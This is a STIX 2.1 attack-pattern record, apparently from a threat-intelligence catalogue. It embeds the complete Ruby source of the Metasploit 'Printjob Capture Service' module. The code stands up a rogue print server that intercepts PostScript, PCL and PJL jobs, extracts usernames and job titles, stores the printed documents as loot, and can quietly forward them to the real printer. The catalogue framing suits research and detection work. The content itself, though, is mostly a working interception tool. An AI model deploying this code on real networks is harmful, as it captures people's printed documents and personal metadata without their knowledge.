{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--69845efe-dcdc-48c9-b0bf-6add843f0d5b",
    "created": "2024-08-14T16:22:00.815807Z",
    "modified": "2024-08-14T16:22:00.81581Z",
    "name": "Printjob Capture Service",
    "description": " This module is designed to listen for PJL or PostScript print jobs. Once a print job is detected it is saved to loot. The captured printjob can then be forwarded on to another printer (required for LPR printjobs). Resulting PCL/PS files can be read with GhostScript/GhostPCL.  Note, this module does not yet support IPP connections. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/capture/printjob_capture.rb",
            "external_id": "printjob_capture.rb"
        },
        {
            "source_name": "reference",
            "url": "http://blog.c22.cc/toolsscripts/prn-2-me/"
        },
        {
            "source_name": "reference",
            "url": "http://www.ghostscript.com"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::TcpServer\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'        => 'Printjob Capture Service',\n      'Description' => %q{\n        This module is designed to listen for PJL or PostScript print\n        jobs. Once a print job is detected it is saved to loot. The\n        captured printjob can then be forwarded on to another printer\n        (required for LPR printjobs). Resulting PCL/PS files can be\n        read with GhostScript/GhostPCL.\n\n        Note, this module does not yet support IPP connections.\n      },\n      'Author'      =>     ['Chris John Riley', 'todb'],\n      'License'     =>     MSF_LICENSE,\n      'References'  =>\n      [\n        # Based on previous prn-2-me tool (Python)\n        ['URL', 'http://blog.c22.cc/toolsscripts/prn-2-me/'],\n        # Readers for resulting PCL/PC\n        ['URL', 'http://www.ghostscript.com']\n      ],\n      'Actions'        => [[ 'Capture', 'Description' => 'Run print job capture server' ]],\n      'PassiveActions' => ['Capture'],\n      'DefaultAction'  => 'Capture'\n    )\n\n    register_options([\n      OptPort.new('SRVPORT',  [ true, 'The local port to listen on', 9100 ]),\n      OptBool.new('FORWARD',  [ true, 'Forward print jobs to another host', false ]),\n      OptAddress.new('RHOST', [ false, 'Forward to remote host' ]),\n      OptPort.new('RPORT',    [ false, 'Forward to remote port', 9100 ]),\n      OptBool.new('METADATA', [ true, 'Display Metadata from printjobs', true ]),\n      OptEnum.new('MODE',     [ true,  'Print mode', 'RAW', ['RAW', 'LPR']]) # TODO: Add IPP\n\n    ])\n\n    deregister_options('SSL', 'SSLVersion', 'SSLCert', 'RHOSTS')\n  end\n\n  def setup\n    super\n    @state = {}\n\n    begin\n\n      @srvhost = datastore['SRVHOST']\n      @srvport = datastore['SRVPORT'] || 9100\n      @mode = datastore['MODE'].upcase || 'RAW'\n      if datastore['FORWARD']\n        @forward = datastore['FORWARD']\n        @rport = datastore['RPORT'] || 9100\n        if datastore['RHOST'].nil?\n          fail_with(Failure::BadConfig, \"Cannot forward without a valid RHOST\")\n        end\n        @rhost = datastore['RHOST']\n        print_status(\"Forwarding all printjobs to #{@rhost}:#{@rport}\")\n      end\n      if not @mode == 'RAW' and not @forward\n        fail_with(Failure::BadConfig, \"Cannot intercept LPR/IPP without a forwarding target\")\n      end\n      @metadata = datastore['METADATA']\n      print_status(\"Starting Print Server on %s:%s - %s mode\" % [@srvhost, @srvport, @mode])\n\n      exploit()\n\n    rescue  =>  ex\n      print_error(ex.message)\n    end\n  end\n\n  def on_client_connect(c)\n    @state[c] = {\n      :name => \"#{c.peerhost}:#{c.peerport}\",\n      :ip => c.peerhost,\n      :port => c.peerport,\n      :user => nil,\n      :pass => nil,\n      :data => '',\n      :raw_data => '',\n      :prn_title => '',\n      :prn_type => '',\n      :prn_metadata => {},\n      :meta_output => []\n    }\n\n    print_status(\"#{name}: Client connection from #{c.peerhost}:#{c.peerport}\")\n  end\n\n  def on_client_data(c)\n    curr_data = c.get_once\n    @state[c][:data] << curr_data\n    if @mode == 'RAW'\n      # RAW Mode - no further actions\n    elsif @mode == 'LPR' or @mode == 'IPP'\n      response = stream_data(curr_data)\n      c.put(response)\n    end\n\n    if (Rex::Text.to_hex(curr_data.first)) == '\\x02' and (Rex::Text.to_hex(curr_data.last)) == '\\x0a'\n      print_status(\"LPR Jobcmd \\\"%s\\\" received\" % curr_data[1..-2]) if not curr_data[1..-2].empty?\n    end\n\n    return if not @state[c][:data]\n  end\n\n  def on_client_close(c)\n    print_status(\"#{name}: Client #{c.peerhost}:#{c.peerport} closed connection after %d bytes of data\" % @state[c][:data].length)\n    sock.close if sock\n\n    # forward RAW data as it's not streamed\n    if @forward and @mode == 'RAW'\n      forward_data(@state[c][:data])\n    end\n\n    #extract print data and Metadata from @state[c][:data]\n    begin\n      # postscript data\n      if @state[c][:data] =~ /%!PS-Adobe/i\n        @state[c][:prn_type] = \"PS\"\n        print_good(\"Printjob intercepted - type PostScript\")\n        # extract PostScript data including header and EOF marker\n        @state[c][:raw_data] = @state[c][:data].match(/%!PS-Adobe.*%%EOF/im)[0]\n        # pcl data (capture PCL or PJL start code)\n      elsif @state[c][:data].unpack(\"H*\")[0] =~ /(1b45|1b25|1b26)/\n        @state[c][:prn_type] = \"PCL\"\n        print_good(\"Printjob intercepted - type PCL\")\n        #extract everything between PCL start and end markers (various)\n        @state[c][:raw_data] = Array(@state[c][:data].unpack(\"H*\")[0].match(/((1b45|1b25|1b26).*(1b45|1b252d313233343558))/i)[0]).pack(\"H*\")\n      end\n      # extract Postsript Metadata\n      metadata_ps(c) if @state[c][:data] =~ /^%%/i\n\n      # extract PJL Metadata\n      metadata_pjl(c) if @state[c][:data] =~ /@PJL/i\n\n      # extract IPP Metadata\n      metadata_ipp(c) if @state[c][:data] =~ /POST \\/ipp/i or @state[c][:data] =~ /application\\/ipp/i\n\n      if @state[c][:prn_type].empty?\n        print_error(\"Unable to detect printjob type, dumping complete output\")\n        @state[c][:prn_type] = \"Unknown Type\"\n        @state[c][:raw_data] = @state[c][:data]\n      end\n\n      # output discovered Metadata if set\n      if @state[c][:meta_output] and @metadata\n        @state[c][:meta_output].sort.each do | out |\n          # print metadata if not empty\n          print_status(\"#{out}\") if not out.empty?\n        end\n      else\n        print_status(\"No metadata gathered from printjob\")\n      end\n\n      # set name to unknown if not discovered via Metadata\n      @state[c][:prn_title] = 'Unnamed' if @state[c][:prn_title].empty?\n\n      #store loot\n      storefile(c) if not @state[c][:raw_data].empty?\n\n      # clear state\n      @state.delete(c)\n\n    rescue  =>  ex\n      print_error(ex.message)\n    end\n  end\n\n  def metadata_pjl(c)\n    # extract PJL Metadata\n\n    @state[c][:prn_metadata] = @state[c][:data].scan(/^@PJL\\s(JOB=|SET\\s|COMMENT\\s)(.*)$/i)\n    print_good(\"Extracting PJL Metadata\")\n    @state[c][:prn_metadata].each do | meta |\n      if meta[0] =~ /^COMMENT/i\n        @state[c][:meta_output] << meta[0].to_s + meta[1].to_s\n      end\n      if meta[1] =~ /^NAME|^STRINGCODESET|^RESOLUTION|^USERNAME|^JOBNAME|^JOBATTR/i\n        @state[c][:meta_output] << meta[1].to_s\n      end\n      if meta[1] =~ /^NAME/i\n        @state[c][:prn_title] = meta[1].strip\n      elsif meta[1] =~/^JOBNAME/i\n        @state[c][:prn_title] = meta[1].strip\n      end\n    end\n  end\n\n  def metadata_ps(c)\n    # extract Postsript Metadata\n\n    @state[c][:prn_metadata] = @state[c][:data].scan(/^%%(.*)$/i)\n    print_good(\"Extracting PostScript Metadata\")\n    @state[c][:prn_metadata].each do | meta |\n      if meta[0] =~ /^Title|^Creat(or|ionDate)|^For|^Target|^Language/i\n        @state[c][:meta_output] << meta[0].to_s\n      end\n      if meta[0] =~ /^Title/i\n        @state[c][:prn_title] = meta[0].strip\n      end\n    end\n  end\n\n  def metadata_ipp(c)\n    # extract IPP Metadata\n\n    @state[c][:prn_metadata] = @state[c][:data]\n    print_good(\"Extracting IPP Metadata\")\n    case @state[c][:prn_metadata]\n    when /User-Agent:/i\n      @state[c][:meta_output] << @state[c][:prn_metadata].scan(/^User-Agent:.*/i)\n    when /Server:/i\n      @state[c][:meta_output] << @state[c][:prn_metadata].scan(/^Server:.*/i)\n    when /printer-uri..ipp:\\/\\/.*\\/ipp\\//i\n      @state[c][:meta_output] << @state[c][:prn_metadata].scan(/printer-uri..ipp:\\/\\/.*\\/ipp\\//i)\n    when /requesting-user-name..\\w+/i\n      @state[c][:meta_output] << @state[c][:prn_metadata].scan(/requesting-user-name..\\w+/i)\n    end\n  end\n\n  def forward_data(data_to_send)\n    print_status(\"Forwarding PrintJob on to #{@rhost}:#{@rport}\")\n    connect\n    sock.put(data_to_send)\n    sock.close\n  end\n\n  def stream_data(data_to_send)\n    vprint_status(\"Streaming %d bytes of data to #{@rhost}:#{@rport}\" % data_to_send.length)\n    connect if not sock\n    sock.put(data_to_send)\n    response = sock.get_once\n    return response\n  end\n\n  def storefile(c)\n    # store the file\n\n    if @state[c][:raw_data]\n      jobname = File.basename(@state[c][:prn_title].gsub(\"\\\\\",\"/\"), \".*\")\n      filename = \"#{jobname}.#{@state[c][:prn_type]}\"\n      loot = store_loot(\n        \"prn_snarf.#{@state[c][:prn_type].downcase}\",\n        \"#{@state[c][:prn_type]} printjob\",\n        c.peerhost,\n        @state[c][:raw_data],\n        filename,\n        \"PrintJob capture\"\n      )\n      print_good(\"Incoming printjob - %s saved to loot\" % @state[c][:prn_title])\n      print_good(\"Loot filename: %s\" % loot)\n    end\n  end\nend\n"
}